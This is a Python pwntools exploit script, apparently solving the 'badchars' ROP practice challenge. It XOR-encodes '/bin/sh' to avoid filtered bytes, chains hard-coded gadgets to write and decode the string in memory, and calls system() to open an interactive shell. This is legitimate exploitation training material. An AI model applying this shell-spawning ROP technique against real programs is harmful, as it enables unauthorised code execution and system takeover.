#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./badchars')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil("> ")

def encode(string, badchars=""):
    found_key = None

    for key in range(0, 0x100):
        if key in badchars:
            continue

        res = b""
        for s in string:
            res += bytes([s ^ key])

        if not any(b in res for b in badchars):
            found_key = key
            break

    print(res)
    print(found_key)
    return res, found_key


mem = 0x601078

binsh = b"/bin/sh"
string, key = encode(binsh, badchars=[b"b", b"i", b"c", b"/", b" ", b"f", b"n", b"s"])

payload = b"A" * 40

for i in range(0, len(string)):
    payload += (
        p64(0x400bac) + # : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
        p64(string[i]) +
        p64(mem + i) +
        p64(key) +
        p64(mem + i) +
        p64(0x400b34) + # : mov qword ptr [r13], r12 ; ret
        p64(0x400b30) # : xor byte ptr [r15], r14b ; ret
    )

payload += (
    p64(0x400b39) + # : pop rdi ; ret
    p64(mem) +
    p64(exe.plt["system"])
)

io.sendline(payload)

io.interactive()

